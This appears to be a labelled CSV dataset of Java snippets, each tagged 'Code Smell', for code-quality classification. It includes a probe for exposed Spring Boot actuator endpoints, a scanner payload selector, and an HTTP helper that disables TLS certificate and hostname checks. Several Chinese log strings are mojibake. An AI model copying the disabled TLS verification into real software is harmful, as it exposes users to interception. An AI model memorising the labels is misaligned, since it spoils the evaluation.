text,label,text_label
"private boolean isColorTooSimilar(BufferedImage image,int left,int top,int width,int height,Color setColor){
  int startX=left + 2;
  int endX=left + width - 2;
  int startY=top + 2;
  int endY=top + height - 2;
  int similarPointCount=0;
  int totalPointCount=0;
  for (int j=startY; j < endY; j++) {
    int pixelColor=getImageRGB(image,startX,j);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
    pixelColor=getImageRGB(image,endX,j);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
  }
  if ((similarPointCount * 1.0 / totalPointCount) >= 0.5f) {
    return true;
  }
  similarPointCount=0;
  totalPointCount=0;
  for (int j=startX; j < endX; j++) {
    int pixelColor=getImageRGB(image,j,startY);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
    pixelColor=getImageRGB(image,j,endY);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
  }
  if ((similarPointCount * 1.0 / totalPointCount) >= 0.5f) {
    return true;
  }
  startX=left - 2;
  endX=left + width + 2;
  startY=top - 2;
  endY=top + height + 2;
  similarPointCount=0;
  totalPointCount=0;
  for (int j=startY; j < endY; j++) {
    int pixelColor=getImageRGB(image,startX,j);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
    pixelColor=getImageRGB(image,endX,j);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
  }
  for (int j=startX; j < endX; j++) {
    int pixelColor=getImageRGB(image,j,startY);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
    pixelColor=getImageRGB(image,j,endY);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
  }
  return ((similarPointCount * 1.0 / totalPointCount) >= 0.5f);
}",1,Code Smell
"/** 
 * Mark completed tiles as loaded, and replaces them by beginning to wait on new positions from the queue (if possible).
 */
protected void updateWaiting(){
  int targetLoadQueueSize=FP2Config.global().performance().terrainThreads();
  List<POS> positions=new ArrayList<>();
  do {
    if (this.queuePaused) {
      return;
    }
    if (!PUnsafe.tryMonitorEnter(this)) {
      return;
    }
    try {
      for (POS pos; (pos=this.doneWaitingPositions.poll()) != null; ) {
        this.waitingPositions.remove(pos);
        this.loadedPositions.add(pos);
      }
      if (this.queuedPositions.isEmpty()) {
        return;
      }
      for (int count=targetLoadQueueSize - this.waitingPositions.size(); count > 0; count--) {
        POS pos=this.queuedPositions.poll();
        if (pos == null) {
          break;
        }
        positions.add(pos);
      }
    }
  finally {
      PUnsafe.monitorExit(this);
    }
    this.waitingPositions.addAll(positions);
    positions.forEach(pos -> this.manager.beginTracking(this,pos));
    positions.clear();
  }
 while (!this.doneWaitingPositions.isEmpty() || this.waitingPositions.size() < targetLoadQueueSize);
}",1,Code Smell
"/** 
 * Delete a folder.
 * @param file The folder name.
 * @return true if successful.
 */
private static boolean rmdir(@NonNull final File file,Context context){
  if (!file.exists())   return true;
  File[] files=file.listFiles();
  if (files != null && files.length > 0) {
    for (    File child : files) {
      rmdir(child,context);
    }
  }
  if (file.delete()) {
    return true;
  }
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
    DocumentFile document=getDocumentFile(file,true,context);
    if (document != null && document.delete()) {
      return true;
    }
  }
  if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
    ContentResolver resolver=context.getContentResolver();
    ContentValues values=new ContentValues();
    values.put(MediaStore.MediaColumns.DATA,file.getAbsolutePath());
    resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,values);
    resolver.delete(MediaStore.Files.getContentUri(""external""),MediaStore.MediaColumns.DATA + ""=?"",new String[]{file.getAbsolutePath()});
  }
  return !file.exists();
}",1,Code Smell
"/** 
 * 注册provider或者receiver对象
 * @param any
 */
public int register(Object any){
  if (any == null) {
    LogUtil.w(TAG,""无法注册空对象"");
    return REGISTER_NULL_OBJECT;
  }
  ClassInfo targetClassInfo=cache.getClassInfo(any.getClass());
  if (targetClassInfo == null) {
    LogUtil.w(TAG,""未找到可注册内容，%s"",any.getClass().getSimpleName());
    return REGISTER_FAILED;
  }
  if (targetClassInfo.getCachedInjectInfo() != null) {
    for (    InjectParamMeta paramMeta : targetClassInfo.getCachedInjectInfo()) {
      InjectParam type=paramMeta.getParamType();
      ParamReference reference=referenceMap.get(type.getName());
      if (reference == null) {
        reference=new ParamReference(type);
        referenceMap.put(type.getName(),reference);
      }
      paramMeta.addToReference(reference,any);
    }
  }
  if (targetClassInfo.getCachedProviderInfo() != null) {
    for (    ProviderInfoMeta providerMeta : targetClassInfo.getCachedProviderInfo()) {
      WeakInjectItem weakInjectItem=providerMeta.buildWeakInjectItem(any);
      ProviderInfo providerInfo=providerMeta.buildProvider();
      providers.add(new Pair<>(providerInfo,weakInjectItem));
    }
  }
  LogUtil.d(TAG,""注册【%s】成功，提供%d个，需要%d个参数"",any.getClass().getSimpleName(),targetClassInfo.getCachedProviderInfo().size(),targetClassInfo.getCachedInjectInfo().size());
  return REGISTER_SUCCESS;
}
",1,Code Smell
"/** 
 * Gets all of the collectable constant values used in this method, sorted by most used first. Skips non-collectable consts, such as non-string object constants
 * @return {@code non-null;} list of constants in most-to-least used order
 */
private ArrayList<TypedConstant> getConstsSortedByCountUse(){
  int regSz=ssaMeth.getRegCount();
  final HashMap<TypedConstant,Integer> countUses=new HashMap<TypedConstant,Integer>();
  final HashSet<TypedConstant> usedByLocal=new HashSet<TypedConstant>();
  for (int i=0; i < regSz; i++) {
    SsaInsn insn=ssaMeth.getDefinitionForRegister(i);
    if (insn == null || insn.getOpcode() == null)     continue;
    RegisterSpec result=insn.getResult();
    TypeBearer typeBearer=result.getTypeBearer();
    if (!typeBearer.isConstant())     continue;
    TypedConstant cst=(TypedConstant)typeBearer;
    if (insn.getOpcode().getOpcode() == RegOps.MOVE_RESULT_PSEUDO) {
      int pred=insn.getBlock().getPredecessors().nextSetBit(0);
      ArrayList<SsaInsn> predInsns;
      predInsns=ssaMeth.getBlocks().get(pred).getInsns();
      insn=predInsns.get(predInsns.size() - 1);
    }
    if (insn.canThrow()) {
      if (!(cst instanceof CstString) || !COLLECT_STRINGS) {
        continue;
      }
      if (insn.getBlock().getSuccessors().cardinality() > 1) {
        continue;
      }
    }
    if (ssaMeth.isRegALocal(result)) {
      if (!COLLECT_ONE_LOCAL) {
        continue;
      }
 else {
        if (usedByLocal.contains(cst)) {
          continue;
        }
 else {
          usedByLocal.add(cst);
        }
      }
    }
    Integer has=countUses.get(cst);
    if (has == null) {
      countUses.put(cst,1);
    }
 else {
      countUses.put(cst,has + 1);
    }
  }
  ArrayList<TypedConstant> constantList=new ArrayList<TypedConstant>();
  for (  Map.Entry<TypedConstant,Integer> entry : countUses.entrySet()) {
    if (entry.getValue() > 1) {
      constantList.add(entry.getKey());
    }
  }
  Collections.sort(constantList,new Comparator<Constant>(){
    @Override public int compare(    Constant a,    Constant b){
      int ret;
      ret=countUses.get(b) - countUses.get(a);
      if (ret == 0) {
        ret=a.compareTo(b);
      }
      return ret;
    }
    @Override public boolean equals(    Object obj){
      return obj == this;
    }
  }
);
  return constantList;
}",1,Code Smell
"/** 
 * Make a QQ custom toast.
 * @param context  The context to use.
 * @param type     The type of toast, Either {@link #TYPE_INFO},  {@link #TYPE_ERROR},  {@link #TYPE_SUCCESS} or{@link #TYPE_INFO}
 * @param text     The text to show.
 * @param duration How long to display the message.  Either {@link #LENGTH_SHORT} or {@link #LENGTH_LONG}
 */
public static void showToast(@Nullable Context context,int type,@NonNull final CharSequence text,int duration){
  Objects.requireNonNull(text,""text"");
  if (context == null) {
    context=HostInfo.getApplication();
  }
  final Context ctx=context;
  SyncUtils.runOnUiThread(() -> {
    if (type == TYPE_PLAIN) {
      Toast.makeText(ctx,text,duration).show();
    }
 else {
      try {
        if (clazz_QQToast == null) {
          clazz_QQToast=load(""com/tencent/mobileqq/widget/QQToast"");
        }
        if (clazz_QQToast == null) {
          Class<?> clz=load(""com/tencent/mobileqq/activity/aio/doodle/DoodleLayout"");
          if (clz != null) {
            Field[] fs=clz.getDeclaredFields();
            for (            Field f : fs) {
              if (View.class.isAssignableFrom(f.getType())) {
                continue;
              }
              if (f.getType().isPrimitive()) {
                continue;
              }
              if (f.getType().isInterface()) {
                continue;
              }
              clazz_QQToast=f.getType();
            }
          }
 else {
            clazz_QQToast=load(""com.tencent.qqmini.sdk.core.widget.QQToast"");
          }
        }
        if (method_Toast_show == null) {
          Method[] ms=clazz_QQToast.getMethods();
          for (          Method m : ms) {
            if (Toast.class.equals(m.getReturnType()) && m.getParameterTypes().length == 0) {
              method_Toast_show=m;
              break;
            }
          }
        }
        if (method_Toast_makeText == null) {
          try {
            method_Toast_makeText=clazz_QQToast.getMethod(""a"",Context.class,int.class,CharSequence.class,int.class);
          }
 catch (          NoSuchMethodException e) {
            try {
              method_Toast_makeText=clazz_QQToast.getMethod(""b"",Context.class,int.class,CharSequence.class,int.class);
            }
 catch (            NoSuchMethodException e2) {
              try {
                method_Toast_makeText=clazz_QQToast.getMethod(""makeText"",Context.class,int.class,CharSequence.class,int.class);
              }
 catch (              NoSuchMethodException e3) {
                throw e;
              }
            }
          }
        }
        Object this_QQToast_does_NOT_extend_a_standard_Toast_so_please_do_NOT_cast_it_to_Toast=method_Toast_makeText.invoke(null,ctx,type,text,duration);
        method_Toast_show.invoke(this_QQToast_does_NOT_extend_a_standard_Toast_so_please_do_NOT_cast_it_to_Toast);
      }
 catch (      Exception e) {
        Log.e(e);
        Toast.makeText(ctx,text,duration).show();
      }
    }
  }
);
}",1,Code Smell
"private static boolean isConstructorInvocationRemote(List<Exprent> list,int index){
  Exprent current=list.get(index);
  if (current.type == Exprent.EXPRENT_ASSIGNMENT) {
    AssignmentExprent as=(AssignmentExprent)current;
    if (as.getLeft().type == Exprent.EXPRENT_VAR && as.getRight().type == Exprent.EXPRENT_NEW) {
      NewExprent newExpr=(NewExprent)as.getRight();
      VarType newType=newExpr.getNewType();
      VarVersionPair leftPair=new VarVersionPair((VarExprent)as.getLeft());
      if (newType.type == CodeConstants.TYPE_OBJECT && newType.arrayDim == 0 && newExpr.getConstructor() == null) {
        for (int i=index + 1; i < list.size(); i++) {
          Exprent remote=list.get(i);
          if (remote.type == Exprent.EXPRENT_INVOCATION) {
            InvocationExprent in=(InvocationExprent)remote;
            if (in.getFunctype() == InvocationExprent.TYP_INIT && in.getInstance().type == Exprent.EXPRENT_VAR && as.getLeft().equals(in.getInstance())) {
              newExpr.setConstructor(in);
              in.setInstance(null);
              list.set(i,as.copy());
              return true;
            }
          }
          Set<VarVersionPair> setVars=remote.getAllVariables();
          if (setVars.contains(leftPair)) {
            return false;
          }
        }
      }
    }
  }
  return false;
}",1,Code Smell
"public boolean checkPoint(String target,String point){
  String url=URLUtil.normalizeURL(target) + point;
  System.out.println(""姝ｅ湪妫�娴嬶細\t"" + url);
  HttpResponse response=HTTPUtils.getRequest(url);
  if (response.getStatus() == 200) {
    if (this.checkPoint(url,response)) {
      this.mainController.logTextArea.appendText(Utils.log(""妫�娴嬪埌 "" + point + "" 绔偣瀛樺湪锛屽凡鍋氶獙璇侊細""+ url));
      flag=true;
    }
 else {
      this.mainController.logTextArea.appendText(Utils.log(""妫�娴嬪埌 "" + point + "" 绔偣锛岃鎵嬪伐楠岃瘉: ""+ url));
    }
  }
  return flag;
}
public boolean checkPoint(String url,HttpResponse resp){
  String s=resp.body();
  if (url.contains(""hystrix.stream"")) {
    return ""ping:"".contains(s) || ""data:"".contains(s);
  }
 else   if (url.contains(""health"")) {
    try {
      Map res=(Map)JSON.parse(s);
      return res.containsKey(""status"") || res.containsKey(""diskSpace"");
    }
 catch (    Exception e) {
      return false;
    }
  }
 else   if (url.contains(""beans"")) {
    Map res;
    try {
      JSONArray objects=JSON.parseArray(s);
      for (      Object o : objects) {
        res=(Map)o;
        return res.containsKey(""bean"") || res.containsKey(""scope"") || res.containsKey(""dependencies"");
      }
    }
 catch (    Exception e) {
      return false;
    }
  }
 else   if (url.contains(""configprops"")) {
    try {
      Map res=(Map)JSON.parse(s);
      return res.containsKey(""configurationPropertiesReportEndpoint"");
    }
 catch (    Exception e) {
      return false;
    }
  }
 else   if (url.contains(""mappings"")) {
    return s.contains(""bean"") || s.contains(""method"");
  }
 else   if (url.contains(""metrics"")) {
    return s.contains(""threads"") || s.contains(""heap"");
  }
  return false;
}",1,Code Smell
"@Test void testDeterministicAndNonDeterministicProvidersReturnValues(){
  final int numberOfTestsPerMethod=100;
  final Reflections reflections=new Reflections(""net.datafaker.providers"");
  final Set<Class<?>> classes=reflections.get(SubTypes.of(AbstractProvider.class).asClass());
  for (  var clazz : classes) {
    final Collection<Method> methods=Arrays.stream(clazz.getDeclaredMethods()).filter(m -> Modifier.isPublic(m.getModifiers()) && m.getParameterCount() == 0).collect(Collectors.toSet());
    if (methods.isEmpty())     continue;
    Constructor<AbstractProvider<?>> constructor=null;
    final AbstractProvider<?> ap;
    try {
      final Set<Constructor<AbstractProvider<?>>> constructorsWith1Arg=Arrays.stream(clazz.getDeclaredConstructors()).filter(c -> c.getParameterCount() == 1).map(c -> (Constructor<AbstractProvider<?>>)c).collect(Collectors.toSet());
      for (      var c : constructorsWith1Arg) {
        final Class<?>[] types=c.getParameterTypes();
        if (types[0].isAssignableFrom(Faker.class)) {
          constructor=c;
          break;
        }
      }
      assertThat(constructor).isNotNull();
      constructor.setAccessible(true);
      ap=constructor.newInstance(faker);
    }
 catch (    InvocationTargetException|InstantiationException|IllegalAccessException e) {
      throw new RuntimeException(e);
    }
    for (    Method m : methods) {
      final var set=new HashSet<>();
      try {
        int currentSize=0;
        for (int i=0; i < numberOfTestsPerMethod && currentSize <= 1; i++) {
          set.add(m.invoke(ap));
          currentSize=set.size();
        }
      }
 catch (      IllegalAccessException|InvocationTargetException e) {
        throw new RuntimeException(e);
      }
      if (m.isAnnotationPresent(Deterministic.class)) {
        assertThat(set).as(""Class: "" + ap.getClass().getName() + "", method: ""+ m.getName()+ "" should have the same return value"").hasSize(1);
      }
 else {
        assertThat(set).as(""Class: "" + ap.getClass().getName() + "", method: ""+ m.getName()+ "" should generate different return values"").hasSizeGreaterThan(1);
      }
    }
  }
}",1,Code Smell
"public void checkEmojiPacks(){
  loadEmojisInfo((error) -> {
    if (getSelectedEmojiPackId().equals(""default""))     return;
    if (emojiPacksInfo.isEmpty()) {
      if (!isInstalledOffline(emojiPack)) {
        emojiPack=""default"";
      }
      reloadEmoji();
      return;
    }
    for (    EmojiPackBase emojiPackBase : emojiPacksInfo) {
      if (emojiPackBase instanceof EmojiPackInfo) {
        EmojiPackInfo emojiPackInfo=(EmojiPackInfo)emojiPackBase;
        boolean update=isInstalledOldVersion(emojiPackInfo.packId,emojiPackInfo.packVersion);
        if (emojiPack.equals(emojiPackInfo.packId)) {
          if (!isPackInstalled(emojiPackInfo)) {
            downloadPack(emojiPackInfo,update,false);
          }
 else {
            reloadEmoji();
          }
          break;
        }
      }
    }
  }
);
}
",1,Code Smell
"@java.lang.Override public void deleteBalance(String id){
  String path=getPath(id);
  String config=dynamicConfiguration.getConfig(path);
  OverrideConfig oldConfig=null;
  if (config != null) {
    OverrideDTO overrideDTO=YamlParser.loadObject(config,OverrideDTO.class);
    List<OverrideConfig> configs=overrideDTO.getConfigs();
    if (configs != null) {
      for (      OverrideConfig overrideConfig : configs) {
        if (Constants.BALANCING.equals(overrideConfig.getType())) {
          if (overrideDTO.getScope().equals(Constants.SERVICE)) {
            oldConfig=overrideConfig;
          }
          configs.remove(overrideConfig);
          break;
        }
      }
      if (configs.size() == 0) {
        dynamicConfiguration.deleteConfig(path);
      }
 else {
        dynamicConfiguration.setConfig(path,YamlParser.dumpObject(overrideDTO));
      }
    }
    if (oldConfig != null) {
      String key=overrideDTO.getKey();
      BalancingDTO balancingDTO=OverrideUtils.configtoBalancingDTO(oldConfig,Constants.SERVICE,key);
      unregisterBalancing(balancingDTO);
    }
  }
}",1,Code Smell
"private Payload generatePayload(PayloadGeneratorConfig config,boolean enforceNoCallback){
  PayloadDefinition selectedPayload=null;
  if (tcsClient.isCallbackServerEnabled() && !enforceNoCallback) {
    for (    PayloadDefinition candidate : payloads) {
      if (isMatchingPayload(candidate,config) && candidate.getUsesCallbackServer().getValue()) {
        selectedPayload=candidate;
        break;
      }
    }
  }
  if (selectedPayload == null) {
    for (    PayloadDefinition candidate : payloads) {
      if (isMatchingPayload(candidate,config) && !candidate.getUsesCallbackServer().getValue()) {
        selectedPayload=candidate;
        break;
      }
    }
  }
  if (selectedPayload == null) {
    throw new NotImplementedException(""No payload implemented for %s vulnerability type, %s interpretation environment, %s"" + "" execution environment"",config.getVulnerabilityType(),config.getInterpretationEnvironment(),config.getExecutionEnvironment());
  }
  return convertParsedPayload(selectedPayload,config);
}
",1,Code Smell
"private void setFeeRatePriority(Double feeRateAmt){
  Map<Integer,Double> targetBlocksFeeRates=getTargetBlocksFeeRates();
  Integer targetBlocks=getTargetBlocks(feeRateAmt);
  if (targetBlocksFeeRates.get(Integer.MAX_VALUE) != null) {
    Double minFeeRate=targetBlocksFeeRates.get(Integer.MAX_VALUE);
    if (minFeeRate > 1.0 && feeRateAmt < minFeeRate) {
      feeRatePriority.setText(""Below Minimum"");
      feeRatePriority.setTooltip(new Tooltip(""Transactions at this fee rate are currently being purged from the default sized mempool""));
      feeRatePriorityGlyph.setStyle(""-fx-text-fill: #a0a1a7cc"");
      feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.EXCLAMATION_CIRCLE);
      return;
    }
    Double lowestBlocksRate=targetBlocksFeeRates.get(TARGET_BLOCKS_RANGE.get(TARGET_BLOCKS_RANGE.size() - 1));
    if (lowestBlocksRate >= minFeeRate && feeRateAmt < (minFeeRate + ((lowestBlocksRate - minFeeRate) / 2)) && !isPayjoinTx()) {
      feeRatePriority.setText(""Try Then Replace"");
      feeRatePriority.setTooltip(new Tooltip(""Send a transaction, verify it appears in the destination wallet, then RBF to get it confirmed or sent to another address""));
      feeRatePriorityGlyph.setStyle(""-fx-text-fill: #7eb7c9cc"");
      feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.PLUS_CIRCLE);
      return;
    }
  }
  if (targetBlocks != null) {
    if (targetBlocks < FeeRatesSource.BLOCKS_IN_HALF_HOUR) {
      Double maxFeeRate=FEE_RATES_RANGE.get(FEE_RATES_RANGE.size() - 1).doubleValue();
      Double highestBlocksRate=targetBlocksFeeRates.get(TARGET_BLOCKS_RANGE.get(0));
      if (highestBlocksRate < maxFeeRate && feeRateAmt > (highestBlocksRate + ((maxFeeRate - highestBlocksRate) / 10))) {
        feeRatePriority.setText(""Overpaid"");
        feeRatePriority.setTooltip(new Tooltip(""Transaction fees at this rate are likely higher than necessary""));
        feeRatePriorityGlyph.setStyle(""-fx-text-fill: #c8416499"");
        feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.EXCLAMATION_CIRCLE);
      }
 else {
        feeRatePriority.setText(""High Priority"");
        feeRatePriority.setTooltip(new Tooltip(""Typically confirms within minutes""));
        feeRatePriorityGlyph.setStyle(""-fx-text-fill: #c8416499"");
        feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.CIRCLE);
      }
    }
 else     if (targetBlocks < FeeRatesSource.BLOCKS_IN_HOUR) {
      feeRatePriority.setText(""Medium Priority"");
      feeRatePriority.setTooltip(new Tooltip(""Typically confirms within an hour or two""));
      feeRatePriorityGlyph.setStyle(""-fx-text-fill: #fba71b99"");
      feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.CIRCLE);
    }
 else {
      feeRatePriority.setText(""Low Priority"");
      feeRatePriority.setTooltip(new Tooltip(""Typically confirms in a day or longer""));
      feeRatePriorityGlyph.setStyle(""-fx-text-fill: #41a9c999"");
      feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.CIRCLE);
    }
  }
}",1,Code Smell
"private void showNotification(String name,Bitmap photo){
  Intent intent=new Intent(this,LaunchActivity.class).setAction(groupCall != null ? ""voip_chat"" : ""voip"");
  if (groupCall != null) {
    intent.putExtra(""currentAccount"",currentAccount);
  }
  Notification.Builder builder=new Notification.Builder(this).setContentText(name).setContentIntent(PendingIntent.getActivity(this,50,intent,PendingIntent.FLAG_MUTABLE));
  if (groupCall != null) {
    builder.setContentTitle(ChatObject.isChannelOrGiga(chat) ? LocaleController.getString(""VoipLiveStream"",R.string.VoipLiveStream) : LocaleController.getString(""VoipVoiceChat"",R.string.VoipVoiceChat));
    builder.setSmallIcon(isMicMute() ? R.drawable.voicechat_muted : R.drawable.voicechat_active);
  }
 else {
    builder.setContentTitle(LocaleController.getString(""VoipOutgoingCall"",R.string.VoipOutgoingCall));
    builder.setSmallIcon(R.drawable.notification);
  }
  Intent endIntent=new Intent(this,VoIPActionsReceiver.class);
  endIntent.setAction(getPackageName() + "".END_CALL"");
  if (groupCall != null) {
    builder.addAction(R.drawable.ic_call_end_white_24dp,ChatObject.isChannelOrGiga(chat) ? LocaleController.getString(""VoipChannelLeaveAlertTitle"",R.string.VoipChannelLeaveAlertTitle) : LocaleController.getString(""VoipGroupLeaveAlertTitle"",R.string.VoipGroupLeaveAlertTitle),PendingIntent.getBroadcast(this,0,endIntent,PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT));
  }
 else {
    builder.addAction(R.drawable.ic_call_end_white_24dp,LocaleController.getString(""VoipEndCall"",R.string.VoipEndCall),PendingIntent.getBroadcast(this,0,endIntent,PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT));
  }
  builder.setPriority(Notification.PRIORITY_MAX);
  builder.setShowWhen(false);
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
    builder.setColor(0xff282e31);
    builder.setColorized(true);
  }
 else   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
    builder.setColor(0xff2ca5e0);
  }
  if (Build.VERSION.SDK_INT >= 26) {
    NotificationsController.checkOtherNotificationsChannel();
    builder.setChannelId(NotificationsController.OTHER_NOTIFICATIONS_CHANNEL);
  }
  if (photo != null) {
    builder.setLargeIcon(photo);
  }
  try {
    startForeground(ID_ONGOING_CALL_NOTIFICATION,builder.getNotification());
  }
 catch (  Exception e) {
    if (photo != null && e instanceof IllegalArgumentException) {
      showNotification(name,null);
    }
  }
}
private void showNotification(){
  if (user != null) {
    showNotification(ContactsController.formatName(user.first_name,user.last_name),getRoundAvatarBitmap(user));
  }
 else {
    showNotification(chat.title,getRoundAvatarBitmap(chat));
  }
}",1,Code Smell
"private void dumpAnnotatedInstance(Class<?> type,Object instance,JsonWriter writer,Set<Object> alreadyDumped) throws IOException {
  DebugDump typedd=type.getAnnotation(DebugDump.class);
  boolean exclude=typedd != null && typedd.exclude();
  boolean allFields=!exclude && (typedd != null || type.getPackageName().startsWith(""de.bluecolored.bluemap""));
  for (  Field field : type.getDeclaredFields()) {
    String key=field.getName();
    Object value;
    try {
      DebugDump dd=field.getAnnotation(DebugDump.class);
      if (dd == null) {
        if (!allFields)         continue;
        if (Modifier.isStatic(field.getModifiers()))         continue;
        if (Modifier.isTransient(field.getModifiers()))         continue;
      }
 else {
        if (dd.exclude())         continue;
      }
      if (dd != null) {
        key=dd.value();
        if (key.isEmpty())         key=field.getName();
      }
      field.setAccessible(true);
      value=field.get(instance);
    }
 catch (    Exception ex) {
      writer.name(""!!"" + key).value(ex.toString());
      continue;
    }
    writer.name(key);
    dumpInstance(value,writer,alreadyDumped);
  }
  for (  Method method : type.getDeclaredMethods()) {
    String key=method.toGenericString();
    Object value;
    try {
      DebugDump dd=method.getAnnotation(DebugDump.class);
      if (dd == null || dd.exclude())       continue;
      key=dd.value();
      if (key.isEmpty())       key=method.toGenericString();
      method.setAccessible(true);
      value=method.invoke(instance);
    }
 catch (    Exception ex) {
      writer.name(""!!"" + key).value(ex.toString());
      continue;
    }
    writer.name(key);
    dumpInstance(value,writer,alreadyDumped);
  }
  for (  Class<?> iface : type.getInterfaces()) {
    dumpAnnotatedInstance(iface,instance,writer,alreadyDumped);
  }
  Class<?> typeSuperclass=type.getSuperclass();
  if (typeSuperclass != null) {
    dumpAnnotatedInstance(typeSuperclass,instance,writer,alreadyDumped);
  }
}
",1,Code Smell
"public static String httpRequestAddHeader(String requestUrl,int timeOut,String requestMethod,String contentType,String postString,String encoding,HashMap<String,String> headers) throws Exception {
  if ("""".equals(encoding) || encoding == null) {
    encoding=DefalutEncoding;
  }
  URLConnection httpUrlConn=null;
  HttpsURLConnection hsc=null;
  HttpURLConnection hc=null;
  InputStream inputStream=null;
  BufferedInputStream bis=null;
  Object var12=null;
  String result;
  try {
    URL url=new URL(requestUrl);
    if (requestUrl.startsWith(""https"")) {
      SSLContext sslContext=SSLContext.getInstance(""SSL"");
      TrustManager[] tm=new TrustManager[]{new X509TrustUtiil()};
      sslContext.init((KeyManager[])null,tm,new SecureRandom());
      SSLSocketFactory ssf=sslContext.getSocketFactory();
      Proxy proxy=(Proxy)currentProxy.get(""proxy"");
      if (proxy != null) {
        hsc=(HttpsURLConnection)url.openConnection(proxy);
      }
 else {
        hsc=(HttpsURLConnection)url.openConnection();
      }
      hsc.setSSLSocketFactory(ssf);
      hsc.setHostnameVerifier(allHostsValid);
      httpUrlConn=hsc;
    }
 else {
      Proxy proxy=(Proxy)currentProxy.get(""proxy"");
      if (proxy != null) {
        hc=(HttpURLConnection)url.openConnection(proxy);
      }
 else {
        hc=(HttpURLConnection)url.openConnection();
      }
      hc.setRequestMethod(requestMethod);
      hc.setInstanceFollowRedirects(false);
      httpUrlConn=hc;
    }
    ((URLConnection)httpUrlConn).setConnectTimeout(timeOut);
    ((URLConnection)httpUrlConn).setReadTimeout(timeOut);
    if (contentType != null && !"""".equals(contentType)) {
      ((URLConnection)httpUrlConn).setRequestProperty(""Content-Type"",contentType);
    }
    String key;
    if (headers != null) {
      Iterator var28=headers.keySet().iterator();
      while (var28.hasNext()) {
        key=(String)var28.next();
        String val=(String)headers.get(key);
        ((URLConnection)httpUrlConn).addRequestProperty(key,val);
      }
    }
    ((URLConnection)httpUrlConn).setDoOutput(true);
    ((URLConnection)httpUrlConn).setDoInput(true);
    ((URLConnection)httpUrlConn).connect();
    if (null != postString && !"""".equals(postString)) {
      OutputStream outputStream=((URLConnection)httpUrlConn).getOutputStream();
      outputStream.write(postString.getBytes(encoding));
      outputStream.close();
    }
    inputStream=((URLConnection)httpUrlConn).getInputStream();
    result=readString(inputStream,encoding);
    key=result;
    return key;
  }
 catch (  IOException var22) {
    System.out.println(var22);
    if (hsc != null) {
      result=readString(hsc.getErrorStream(),encoding);
      return result;
    }
    if (hc != null) {
      result=readString(hc.getErrorStream(),encoding);
      return result;
    }
    result="""";
  }
catch (  Exception var23) {
    throw var23;
  }
 finally {
    if (hsc != null) {
      hsc.disconnect();
    }
    if (hc != null) {
      hc.disconnect();
    }
  }
  return result;
}",1,Code Smell
